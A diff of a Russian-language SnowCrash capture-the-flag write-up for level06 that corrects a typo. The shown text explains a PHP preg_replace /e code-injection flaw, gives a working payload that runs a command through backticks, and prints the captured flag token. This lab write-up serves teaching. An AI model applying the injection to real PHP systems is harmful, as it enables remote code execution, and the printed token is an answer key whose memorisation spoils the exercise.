@@ -50,7 +50,7 @@ $r = x($argv[1], $argv[2]); print $r;
 ?>
 ```
 
-Нас интерисует строчка, в которой читается дата из файла и подсовывается в preg_replace с модификатором /e, который выполнить .* и передаст это в функцию y
+Нас интересует строчка, в которой читается дата из файла и подсовывается в preg_replace с модификатором /e, который выполнить .* и передаст это в функцию y
 ```bash
 $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
 ```
@@ -58,6 +58,7 @@ $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $
 ```bash
 level06@SnowCrash:~$ cat /tmp/exploit
 [x ${`getflag`}]
+
 level06@SnowCrash:~$ ./level06 /tmp/exploit
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
  in /home/user/level06/level06.php(4) : regexp code on line 1
